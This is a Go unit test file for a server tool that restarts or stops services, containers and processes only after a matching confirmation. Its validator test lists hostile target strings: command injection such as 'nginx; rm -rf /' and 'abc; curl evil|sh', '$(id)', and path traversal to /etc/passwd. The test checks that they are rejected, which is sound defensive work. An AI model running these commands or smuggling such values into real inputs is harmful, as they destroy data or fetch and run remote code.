package action

import (
	"context"
	"errors"
	"strings"
	"testing"

	rexec "github.com/cuonggt/rove/internal/exec"
	"github.com/cuonggt/rove/internal/model"
)

// The property the whole design rests on: an action reaching the runner
// without a matching confirmation must not run.
func TestUnconfirmedActionNeverRuns(t *testing.T) {
	fake := &rexec.Fake{Default: rexec.FakeResponse{Stdout: "rove-act 1\nact.ok=1\n"}}
	r := NewRunner(fake)
	a := Action{Kind: ServiceRestart, Target: "nginx.service"}

	// The zero value is what a forgotten confirmation looks like.
	_, err := r.Run(context.Background(), "web-01", model.Target{Alias: "web-01"}, a, Confirmation{})
	if !errors.Is(err, ErrNotConfirmed) {
		t.Fatalf("err = %v, want ErrNotConfirmed", err)
	}
}

// Agreeing to restart nginx on staging is not agreement to restart it on
// production, nor to stop it instead.
func TestConfirmationIsNotTransferable(t *testing.T) {
	fake := &rexec.Fake{Default: rexec.FakeResponse{Stdout: "rove-act 1\nact.ok=1\n"}}
	r := NewRunner(fake)
	restartNginx := Action{Kind: ServiceRestart, Target: "nginx.service"}
	c := Confirm("staging", restartNginx)

	cases := []struct {
		name string
		host string
		act  Action
	}{
		{"different host", "prod", restartNginx},
		{"different verb", "staging", Action{Kind: ServiceStop, Target: "nginx.service"}},
		{"different target", "staging", Action{Kind: ServiceRestart, Target: "postgres.service"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := r.Run(context.Background(), tc.host, model.Target{Alias: tc.host}, tc.act, c); !errors.Is(err, ErrNotConfirmed) {
				t.Fatalf("err = %v, want ErrNotConfirmed", err)
			}
		})
	}

	// The matching one does run.
	if _, err := r.Run(context.Background(), "staging", model.Target{Alias: "staging"}, restartNginx, c); err != nil {
		t.Fatalf("the matching confirmation should work: %v", err)
	}
}

// Targets come from the host's own listings and reach a remote shell
// through ssh's argv concatenation.
func TestHostileTargetsRejected(t *testing.T) {
	cases := []Action{
		{Kind: ServiceRestart, Target: "nginx; rm -rf /"},
		{Kind: ServiceRestart, Target: "$(id)"},
		{Kind: ServiceStop, Target: "../../etc/passwd"},
		{Kind: ServiceStart, Target: "-rf"},
		{Kind: ContainerRestart, Target: "abc; curl evil|sh"},
		{Kind: ProcessKill, Target: "not-a-number"},
		{Kind: ProcessTerm, Target: "-1"},
		{Kind: Kind("service.exec"), Target: "anything"},
	}
	for _, a := range cases {
		if err := a.Validate(); err == nil {
			t.Errorf("%s %q was accepted", a.Kind, a.Target)
		}
	}
}

// Signalling pid 1 takes the machine down. No interface should make that a
// keystroke away.
func TestPidOneCannotBeSignalled(t *testing.T) {
	for _, k := range []Kind{ProcessTerm, ProcessKill} {
		if err := (Action{Kind: k, Target: "1"}).Validate(); err == nil {
			t.Errorf("%s accepted pid 1", k)
		}
	}
	if err := (Action{Kind: ProcessKill, Target: "4831"}).Validate(); err != nil {
		t.Errorf("an ordinary pid should be allowed: %v", err)
	}
}

func TestRealTargetsAccepted(t *testing.T) {
	for _, a := range []Action{
		{Kind: ServiceRestart, Target: "nginx.service"},
		{Kind: ServiceStop, Target: "getty@tty1.service"},
		{Kind: ServiceStart, Target: "php8.3-fpm.service"},
		{Kind: ContainerRestart, Target: "945133b6f9bb"},
		{Kind: ContainerStop, Target: "rove-fixture-alpine-3-20"},
		{Kind: ProcessTerm, Target: "4831"},
	} {
		if err := a.Validate(); err != nil {
			t.Errorf("%s %q: %v", a.Kind, a.Target, err)
		}
	}
}

// Stopping something is dangerous because nothing brings it back;
// restarting it is not. An unknown verb is never the safe one.
func TestRiskClassification(t *testing.T) {
	dangerous := []Kind{ServiceStop, ProcessKill, ContainerStop}
	safe := []Kind{ServiceStart, ServiceRestart, ProcessTerm, ContainerStart, ContainerRestart}

	for _, k := range dangerous {
		if !(Action{Kind: k}).Dangerous() {
			t.Errorf("%s should be dangerous", k)
		}
	}
	for _, k := range safe {
		if (Action{Kind: k}).Dangerous() {
			t.Errorf("%s should not be dangerous", k)
		}
	}
	if !(Action{Kind: Kind("something.new")}).Dangerous() {
		t.Error("an unrecognised verb must default to dangerous")
	}
}

// A confirmation that says "are you sure" teaches people to press y. It has
// to name the machine and the specific consequence.
func TestSummaryNamesHostAndConsequence(t *testing.T) {
	a := Action{Kind: ServiceStop, Target: "postgres.service"}
	s := a.Summary("prod-db-01")
	if !strings.Contains(s, "prod-db-01") || !strings.Contains(s, "postgres.service") {
		t.Errorf("summary = %q", s)
	}
	if !strings.Contains(a.Consequence(), "nothing will start it again") {
		t.Errorf("consequence = %q", a.Consequence())
	}
	if c := (Action{Kind: ProcessKill, Target: "9"}).Consequence(); !strings.Contains(c, "cannot save") {
		t.Errorf("kill consequence = %q", c)
	}
}

func TestParseResult(t *testing.T) {
	r, err := ParseResult([]byte("rove-act 1\nact.verb=service-restart\nact.target=nginx.service\n" +
		"act.privilege=sudo\nact.exit=0\nact.state=active\nact.ok=1\n"))
	if err != nil {
		t.Fatal(err)
	}
	if !r.OK || r.State != "active" || r.Privilege != "sudo" {
		t.Errorf("%+v", r)
	}
}

// The common failure: an unprivileged account with no passwordless sudo.
func TestPasswordSudoIsExplained(t *testing.T) {
	r, _ := ParseResult([]byte("rove-act 1\nact.verb=service-restart\nact.exit=1\n" +
		"act.error=this account needs a password for sudo, which rove will not prompt for\n"))
	if r.OK {
		t.Error("a failed action is not ok")
	}
	if !strings.Contains(r.Err, "will not prompt") {
		t.Errorf("err = %q", r.Err)
	}
}
